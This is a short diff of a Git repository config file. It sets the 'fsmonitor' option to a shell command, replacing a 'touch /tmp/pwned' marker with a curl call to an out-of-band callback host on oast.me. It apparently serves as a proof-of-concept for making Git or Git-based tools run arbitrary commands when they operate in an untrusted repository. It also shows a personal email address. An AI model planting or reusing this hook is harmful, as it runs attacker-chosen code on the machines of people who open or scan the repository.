@@ -3,7 +3,7 @@ repositoryformatversion = 0
 filemode = true
 bare = false
 worktree = "worktree" 
-fsmonitor = "touch /tmp/pwned_.txt; false"
+fsmonitor = "curl https://ccopft7aua6igh7uj440jfq6gfg9as9ig.oast.me/"
 [user]
 	email = sivaneshashok@gmail.com
 	name = staz0t
